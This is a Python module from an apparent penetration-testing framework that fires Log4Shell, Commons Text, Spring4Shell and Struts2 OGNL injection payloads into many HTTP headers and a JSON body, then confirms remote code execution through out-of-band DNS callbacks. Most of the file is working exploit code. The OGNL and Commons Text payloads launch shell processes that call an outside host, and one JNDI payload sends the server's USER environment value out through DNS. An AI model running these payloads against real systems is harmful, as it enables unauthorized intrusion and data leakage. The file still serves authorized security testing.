#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK — Zero-Click Server-Side Expression Injection

⚠️ FOR AUTHORIZED TESTING ONLY ⚠️

Fires OOB-tokened JNDI / EL / SpEL / OGNL / Commons-Text payloads into
every likely landing point (URL query, common headers, common body
fields) on the target. Every payload embeds a unique per-request DNS
subdomain from the OOB collector. Detection is single-sourced: a
finding only lands when the collector observes the callback.

Covered families:
  * CVE-2021-44228 Log4Shell (JNDI/LDAP)
  * CVE-2021-45046 Log4j 2.x (JNDI/RMI variants)
  * CVE-2022-42889 Commons Text 1.10-  (${script:...})
  * CVE-2022-33980 Commons Configuration
  * CVE-2022-22965 Spring4Shell (class.module.classLoader.*)
  * CVE-2022-42710 / OGNL (${#context...})
  * CVE-2018-11776 Struts2 OGNL
  * Text4Shell family (StringSubstitutor)

Zero-click means the payload is ingested by a backend worker (log
processor, telemetry collector, template renderer) with no user in the
loop. HTTP responses are usually 200 with no visible evidence, so
in-band detection is unreliable — hence OOB-only.
"""
from __future__ import annotations

import json
from typing import Iterable, Tuple

from modules.base import BaseModule


# Common headers that get logged verbatim on many stacks — the classic
# Log4Shell targets. Kept lean; the framework's requester already knows
# how to rotate UA/Referer, we're overriding for one probe per header.
_HEADER_SURFACES = (
    "User-Agent",
    "X-Api-Version",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Real-IP",
    "Referer",
    "X-Requested-With",
    "X-Client-IP",
    "X-Original-URL",
    "X-Custom-IP-Authorization",
    "True-Client-IP",
    "X-Wap-Profile",
    "From",
    "Accept-Language",
)


def _payload_templates(canary_host: str) -> Iterable[Tuple[str, str]]:
    """Yield (family_label, payload_string) tuples with canary_host baked in."""
    yield "log4shell-ldap",   f"${{jndi:ldap://{canary_host}/a}}"
    yield "log4shell-dns",    f"${{jndi:dns://{canary_host}/a}}"
    yield "log4shell-rmi",    f"${{jndi:rmi://{canary_host}/a}}"
    yield "log4shell-lower",  f"${{${{lower:j}}ndi:ldap://{canary_host}/a}}"
    yield "log4shell-env",    f"${{jndi:ldap://${{env:USER}}.{canary_host}/a}}"
    yield "commons-text-script", (
        f"${{script:javascript:new java.lang.ProcessBuilder(['nslookup','{canary_host}']).start()}}"
    )
    yield "commons-text-url", f"${{url:http:https://{canary_host}}}"
    yield "commons-text-dns", f"${{dns:address|{canary_host}}}"
    yield "spring4shell",     (
        "class.module.classLoader.resources.context.parent.pipeline"
        f".first.pattern=%{{c2}}i%{{c2}}i&class.module.classLoader.resources"
        f".context.parent.pipeline.first.suffix=.jsp"
    )
    yield "ognl-struts",      (
        "${(#_='multipart/form-data')."
        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):"
        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear())."
        "(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))))."
        f"(#cmd='nslookup {canary_host}')."
        "(#p=new java.lang.ProcessBuilder({'sh','-c',#cmd})).(#p.start())}"
    )


class Log4jFamilyModule(BaseModule):
    """Zero-click server-side expression injection (Log4j / Commons Text / SpEL / OGNL)."""

    name = "Zero-Click Expression Injection (Log4j family)"
    vuln_type = "log4j_family"

    # ------------------------------------------------------------------

    def test_url(self, url: str):
        """Host-level probe: hit the target once per header surface with
        the full payload family, then wait for an OOB hit."""
        oob = getattr(self.engine, "oob_manager", None)
        if oob is None or not getattr(oob, "enabled", False):
            # Refuse to send payloads we cannot confirm. Detection scans
            # see no traffic from this module at all.
            return

        token, callback_url = oob.get_callback_url(
            vuln_type=self.vuln_type, url=url, param="headers",
        )
        if not token or not callback_url:
            return
        canary_host = oob.get_dns_canary(token)
        if not canary_host:
            return

        # Fire the full payload set against every header surface. The
        # header hosts the injection; the URL and method are just the
        # delivery vehicle. On many stacks the payload lands in an
        # access log parsed downstream by a JVM logger.
        for header in _HEADER_SURFACES:
            for family, payload in _payload_templates(canary_host):
                try:
                    self.requester.request(
                        url, "GET",
                        headers={header: payload},
                    )
                except Exception:
                    continue

        # Also try body-side landing points (JSON key + form field), which
        # cover URL-shortener / telemetry-DSN / log-forwarder ingest paths.
        try:
            self.requester.request(
                url, "POST",
                data=json.dumps({"user": f"${{jndi:dns://{canary_host}/j}}"}),
                headers={"Content-Type": "application/json"},
            )
        except Exception:
            pass

        # Confirm: single wait on the token — one finding per URL max.
        try:
            hits = oob.check(token, timeout=int(self.config.get("oob_timeout", 12)))
        except Exception:
            hits = []
        if not hits:
            return

        # Prefer the first hit's metadata for evidence.
        first = hits[0] if isinstance(hits, list) else {}
        source_ip = ""
        path = ""
        try:
            source_ip = str(first.get("source_ip") or "")
            path = str(first.get("path") or "")
        except Exception:
            pass

        from core.engine import Finding
        self.engine.add_finding(Finding(
            technique="Zero-Click JNDI / Log4Shell / Commons-Text (OOB confirmed)",
            url=url,
            severity="CRITICAL",
            confidence=0.99,
            param="headers+body",
            payload=f"token={token} canary={canary_host}",
            evidence=(
                f"OOB collector recorded {len(hits)} callback(s) after Log4j-family "
                f"probe. First hit: source_ip={source_ip}, path={path}. "
                f"Server ingested the payload and its backend expression evaluator "
                f"reached out — this is a confirmed remote code execution path."
            ),
        ))

    def test(self, url: str, method: str, param: str, value: str):
        """No-op: this module is host-level. Per-parameter injection is
        covered by the framework's other expression-injection modules
        (SSTI, cmdi, deserialization) which route via the same OOB
        contract."""
        return
